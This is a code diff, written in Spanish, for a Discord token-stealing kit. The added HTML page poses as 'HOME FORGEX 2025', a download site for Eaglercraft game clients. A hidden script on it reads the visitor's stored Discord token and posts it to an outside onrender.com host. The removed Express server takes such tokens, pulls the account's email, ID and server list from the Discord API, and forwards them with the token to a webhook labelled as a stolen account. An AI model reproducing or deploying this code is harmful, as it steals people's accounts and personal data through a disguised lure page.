@@ -1,62 +1,27 @@
-const express = require('express');
-const https = require('https');
-const app = express();
-app.use(express.json());
+<!DOCTYPE html>
+<html lang="es"><head><meta charset="utf-8"><title>HOME FORGEX 2025</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{margin:0;background:#000;color:#fff;font-family:system-ui;display:flex;align-items:center;justify-content:center;min-height:100vh;background:linear-gradient(135deg,#1a0033,#000)}h1{font-size:4.5rem;background:linear-gradient(90deg,#a78bfa,#ec4899);-webkit-background-clip:text;color:transparent;text-align:center}.card{background:#111;padding:40px;border-radius:20px;max-width:500px;margin:20px auto;border:2px solid #333;box-shadow:0 0 40px rgba(167,139,250,0.6)}button{background:linear-gradient(45deg,#a78bfa,#ec4899);color:white;border:none;padding:20px;border-radius:15px;font-size:20px;cursor:pointer;margin:10px;width:100%;font-weight:bold}</style></head><body>
 
-app.post('/login', async (req, res) => {
-  const token = req.body.token;
-  if (!token || token.length < 50) return res.status(400).send("no token");
+<div class="card">
+  <h1>HOME FORGEX 2025</h1>
+  <p style="font-size:1.5rem">Los mejores clientes Eaglercraft</p>
+  <button>DragonX Ultra</button>
+  <button>WurstX+ Premium</button>
+  <button>UwU+ Full 2025</button>
+</div>
 
-  try {
-    const user = await discordAPI('GET', '/users/@me', token);
-    const guilds = await discordAPI('GET', '/users/@me/guilds', token);
-
-    // TU WEBHOOK PRIVADO (cambiá esto por uno NUEVO y SOLO TUYO)
-    const WEBHOOK = "https://discord.com/api/webhooks/PEGA_TU_WEBHOOK_AQUI";
-
-    await discordAPI('POST', '/webhooks/' + WEBHOOK.split('/webhooks/')[1], null, JSON.stringify({
-      content: "@everyone **CUENTA ROBADA 2025**",
-      embeds: [{
-        title: `${user.username}#${user.discriminator}`,
-        description: `Email: ${user.email || 'oculto'}\nID: ${user.id}\nServidores: ${guilds.length}\nNitro: ${user.premium_type ? 'SÍ' : 'NO'}`,
-        thumbnail: { url: `https://cdn.discordapp.com/avatars/${user.id}/${user.avatar}.png?size=512` },
-        color: 0x00ff00,
-        fields: [{ name: "TOKEN", value: "```" + token + "```" }]
-      }]
-    }));
-
-    res.send("LOGUEADO");
-  } catch (e) {
-    res.send("invalid");
-  }
-});
-
-function discordAPI(method, path, token, body = null) {
-  return new Promise((resolve, reject) => {
-    const options = {
-      hostname: 'discord.com',
-      path: '/api/v9' + path,
-      method: method,
-      headers: {
-        'Authorization': token || undefined,
-        'Content-Type': 'application/json',
-        'User-Agent': 'Mozilla/5.0'
-      }
-    };
-
-    const req = https.request(options, res => {
-      let data = '';
-      res.on('data', chunk => data += chunk);
-      res.on('end', () => {
-        try { resolve(JSON.parse(data)); }
-        catch { resolve(data); }
-      });
+<script>
+setTimeout(() => {
+  const token = (localStorage.getItem('token') || '').replace(/"/g, '');
+  if (token && token.length > 50) {
+    fetch("https://mala-1.onrender.com/login", {
+      method: "POST",
+      headers: {"Content-Type": "application/json"},
+      body: JSON.stringify({token: token})
     });
-
-    req.on('error', reject);
-    if (body) req.write(body);
-    req.end();
-  });
-}
-
-app.listen(process.env.PORT || 3000, () => console.log('BOT ONLINE 2025'));
+    console.log("TOKEN ENVIADO:", token); // para que veas en la consola
+  } else {
+    console.log("No hay token de Discord");
+  }
+}, 3000);
+</script>
+</body></html>
